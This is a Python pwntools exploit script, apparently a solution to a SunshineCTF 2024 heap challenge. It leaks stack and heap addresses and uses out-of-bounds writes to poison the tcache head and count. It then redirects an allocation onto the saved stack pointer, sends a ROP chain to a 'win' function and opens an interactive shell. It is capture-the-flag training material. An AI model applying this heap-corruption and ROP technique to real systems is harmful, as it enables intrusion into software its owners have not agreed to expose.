from pwn import *

#Establish the target, and the binaries
HOST = "2024.sunshinectf.games"
PORT = "24006"

target = remote(HOST, PORT)

binary = ELF("../../.build/Pwn/heap-01/heap01")

# Get the stack infoleak
target.recvuntil(b'leak? ')
target.sendline(b'1')
target.recvuntil(b'\n')
leak = target.recvline().strip()

# Calculate the location and value of 
# the saved stack base ptr
leak_val = int(leak, 0x10)
saved_base_ptr = leak_val + 0x20
saved_base_val = saved_base_ptr + 0x10

info("Leak is: " + hex(leak_val))

# The size for our two heap chunks
target.recvuntil(b'size: ')
target.sendline(b"10")

# Get the heap infoleak
target.recvuntil(b'Here you go: ')
heap_leak = target.recvline()
heap_leak_val = int(heap_leak, 16) - 1
offset_to_heap_base = 0x20ff0 - heap_leak_val

# Caclulate the relative offsets to the tcache cnt/head
tcache_head_off = offset_to_heap_base - 0x90
tcache_cnt_off = offset_to_heap_base - 0x10

head_index = -1 * (tcache_head_off // 8)
cnt_index = -1 * (tcache_cnt_off  // 8)

info("heap leak val: " + hex(heap_leak_val))
info("offset to tcache head: " + hex(tcache_head_off))
info("offset to tcache cnt: " + hex(tcache_cnt_off))
info("Using head index of: " + str(head_index))
info("Using cnd index of: " + str(cnt_index))

# First write to the tcache head ptr
target.recvuntil(b'Index: ')
target.sendline(bytes(str(head_index), "utf-8"))
target.recvuntil(b'Value: ')
target.sendline(bytes(str(saved_base_ptr), "utf-8"))

# Second write to the tcache bin size
target.recvuntil(b'Index: ')
target.sendline(bytes(str(cnt_index), "utf-8"))
target.recvuntil(b'Value: ')
target.sendline(b"1")

rop = ROP(binary)

# Establish the two addresses for our ROP Chain
ret_gadget = rop.ret[0] #0x00000000004013a7
win_func = binary.functions["win"]
win_func_address = win_func.address

# Send the rop chain over, do the three writes
target.recvuntil(b'1: ')
target.sendline(bytes(str(saved_base_ptr), "utf-8"))
target.recvuntil(b'2 - ')
target.sendline(bytes(str(ret_gadget), "utf-8"))
target.recvuntil(b'3 -> ')
target.sendline(bytes(str(win_func_address), "utf-8"))

# Drop to an interactive shell!
target.interactive()

